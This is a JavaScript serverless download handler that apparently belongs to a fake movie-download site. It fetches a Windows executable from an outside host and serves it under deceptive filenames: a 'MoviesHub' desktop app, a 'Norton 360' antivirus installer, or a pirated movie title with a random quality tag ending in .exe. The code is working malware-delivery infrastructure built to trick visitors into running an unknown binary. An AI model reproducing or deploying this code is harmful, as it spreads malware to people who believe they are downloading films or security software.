// api/download.js
export default async function handler(req, res) {
  // Set CORS headers to allow cross-origin requests
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // Handle preflight requests
  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  const remoteFile =
    "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";

  // Get movie name from query parameter
  const movieName = req.query.movie || "Movie";

  // Function to get random quality suffix
  function getRandomQuality() {
    const qualities = [
      "1080p",
      "720p",
      "4K",
      "HDRip",
      "BluRay",
      "WEBRip",
      "DVDRIP",
      "BRRIP",
    ];
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
  }

  // Function to clean movie name for filename
  function cleanMovieName(name) {
    return name
      .replace(/[^a-zA-Z0-9\s]/g, "") // Remove special characters
      .replace(/\s+/g, "_") // Replace spaces with underscores
      .replace(/_{2,}/g, "_") // Replace multiple underscores with single
      .trim(); // Remove leading/trailing spaces
  }

  try {
    console.log("Fetching file from:", remoteFile);
    console.log("Movie name received:", movieName);

    const response = await fetch(remoteFile, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    });

    if (!response.ok) {
      console.error(
        "Failed to fetch file:",
        response.status,
        response.statusText
      );
      return res.status(500).json({
        error: "Failed to fetch file",
        status: response.status,
        statusText: response.statusText,
      });
    }

    // Generate filename based on movie name
    let filename;

    if (movieName === "MoviesHub" || movieName === "Desktop Application") {
      // For MoviesHub desktop app download
      const version = "2.1.5";
      filename = `MoviesHub_v${version}_Setup.exe`;
    } else if (movieName === "Norton") {
      // For Norton antivirus download
      const version = "360_v22.24.1";
      filename = `Norton_${version}_Setup.exe`;
    } else {
      // For movie downloads (this shouldn't happen with the popup, but keeping as fallback)
      const cleanedMovieName = cleanMovieName(movieName);
      const randomQuality = getRandomQuality();
      const randomId = Math.random().toString(36).substring(2, 4).toUpperCase();
      const year = new Date().getFullYear();
      filename = `${cleanedMovieName}_${year}_${randomQuality}_${randomId}.exe`;
    }

    console.log("Generated filename:", filename);

    // Set headers for file download
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");

    // Get the response body as buffer and send it
    const buffer = await response.arrayBuffer();
    const nodeBuffer = Buffer.from(buffer);

    // Set content length
    res.setHeader("Content-Length", nodeBuffer.length);

    res.send(nodeBuffer);
  } catch (error) {
    console.error("Download error:", error);
    res.status(500).json({
      error: "Internal Server Error",
      message: error.message,
      stack: process.env.NODE_ENV === "development" ? error.stack : undefined,
    });
  }
}
